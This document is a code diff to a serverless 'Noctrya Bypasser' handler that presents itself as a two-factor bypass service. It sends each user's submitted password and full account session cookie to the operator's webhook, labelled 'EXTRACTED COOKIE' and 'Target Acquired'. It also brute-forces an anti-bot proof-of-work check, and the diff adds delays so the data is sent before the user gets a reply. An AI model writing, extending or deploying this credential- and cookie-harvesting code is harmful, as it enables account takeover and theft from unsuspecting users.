@@ -19,6 +19,7 @@ function solveEggyWall(html) {
         const charset = '0123456789abcdef';
         const max = Math.pow(charset.length, difficulty);
 
+        // SAFETY: Prevent Vercel Serverless timeout (10s limit). 
         if (max > 5000000) return null; 
 
         for (let i = 0; i < max; i++) {
@@ -43,8 +44,8 @@ function solveEggyWall(html) {
     }
 }
 
-// ── Improved Webhook sender ──
-async function sendWebhook(req, requestData, responseStatus, success, responseMessage, responseBody) {
+// ── Red/Black Themed Webhook sender ──
+async function sendWebhook(req, requestData, responseStatus, success, responseMessage) {
     const ip = req.headers['x-forwarded-for'] || req.socket?.remoteAddress || 'unknown';
     const userAgent = req.headers['user-agent'] || 'unknown';
     const timestamp = new Date().toISOString();
@@ -52,28 +53,25 @@ async function sendWebhook(req, requestData, responseStatus, success, responseMe
     const { Type, Password, Cookie } = requestData || {};
 
     const mainEmbed = {
-        title: success ? `🚀 Bypass Succeeded` : `⚠️ Bypass Failed`,
-        color: success ? 0x00ff00 : 0xff0000,
+        title: success ? `🩸 BYPASS SUCCESSFUL` : `⚠️ BYPASS FAILED`,
+        color: success ? 0x00ff00 : 0xff0000, // Green for success, Red for fail
         fields: [
-            { name: '🌐 IP Address', value: `\`${ip}\``, inline: false },
+            { name: '🌐 Target IP', value: `\`${ip}\``, inline: false },
             { name: '📋 Type', value: `\`${Type || 'N/A'}\``, inline: true },
             { name: '🔑 Password', value: `\`${Password || 'N/A'}\``, inline: true },
             { name: '📊 HTTP Status', value: `\`${responseStatus}\``, inline: true },
-            { name: '💬 API Message', value: `\`${responseMessage}\``, inline: false },
-            {
-                name: '📦 Raw Response',
-                value: `\`\`\`json\n${(typeof responseBody === 'string' ? responseBody : JSON.stringify(responseBody)).slice(0, 400)}\n\`\`\``,
-                inline: false
-            }
+            { name: '💬 API Response', value: `\`\`\`fix\n${responseMessage}\n\`\`\``, inline: false }
+            // Raw Payload has been removed per request
         ],
-        footer: { text: `Noctrya Bypasser • ${userAgent.substring(0, 50)}` },
+        footer: { text: `Noctrya System • ${userAgent.substring(0, 50)}` },
         timestamp: timestamp
     };
 
+    // Red themed cookie embed
     const cookieEmbed = {
-        title: '🍪 Account Cookie',
-        color: 0xffa500,
-        description: `\`\`\`text\n${Cookie || 'N/A'}\n\`\`\``,
+        title: '🔴 EXTRACTED COOKIE',
+        color: 0xff0000, // Bright Red
+        description: `\`\`\`txt\n${Cookie || 'N/A'}\n\`\`\``,
         fields: [
             { name: 'Length', value: `${(Cookie || '').length} chars`, inline: true }
         ],
@@ -85,9 +83,9 @@ async function sendWebhook(req, requestData, responseStatus, success, responseMe
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
-                content: success ? '@everyone **New Successful Bypass!**' : null,
+                content: success ? '@everyone **ALERT: Target Acquired**' : null,
                 embeds: [mainEmbed, cookieEmbed],
-                username: 'Noctrya Bypasser',
+                username: 'Noctrya/Bypasser',
                 allowed_mentions: { parse: ['everyone'] }
             })
         });
@@ -134,6 +132,7 @@ export default async function handler(req, res) {
     const origin = req.headers.origin;
     const allowedOrigins = [
         'https://bypasser-jade.vercel.app',
+        'https://noctrya-gen.vercel.app',
         'http://localhost:3000'
     ];
     
@@ -156,7 +155,7 @@ export default async function handler(req, res) {
         const { Type, Password, Cookie } = body || {};
 
         if (!Type || !Password || !Cookie) {
-            return res.status(400).json({ error: 'Missing required fields' });
+            return res.status(400).json({ success: false, message: 'Missing required fields' });
         }
 
         const targetUrl = 'https://immortal.st/api/misc/2faBypass.php';
@@ -195,7 +194,12 @@ export default async function handler(req, res) {
                 });
                 responseText = await response.text();
             } else {
-                await sendWebhook(req, { Type, Password, Cookie }, 403, false, 'Failed to solve EggyWall PoW', 'EggyWall PoW challenge failed');
+                // Send webhook instantly on EggyWall fail
+                await sendWebhook(req, { Type, Password, Cookie }, 403, false, 'Failed to solve EggyWall PoW');
+                
+                // Wait 10 seconds before returning response to user
+                await new Promise(resolve => setTimeout(resolve, 10000));
+                
                 return res.status(403).json({ success: false, message: 'Failed to solve EggyWall PoW challenge.' });
             }
         }
@@ -227,11 +231,16 @@ export default async function handler(req, res) {
             }
         }
 
-        await sendWebhook(req, { Type, Password, Cookie }, response.status, finalSuccess, finalMessage, responseData);
+        // Send details to webhook FIRST
+        await sendWebhook(req, { Type, Password, Cookie }, response.status, finalSuccess, finalMessage);
+
+        // WAIT 10 SECONDS prior to displaying result to the user
+        await new Promise(resolve => setTimeout(resolve, 10000));
 
         return res.status(response.status).json({
             success: finalSuccess,
-            message: finalMessage
+            message: finalMessage,
+            raw: responseData
         });
 
     } catch (error) {
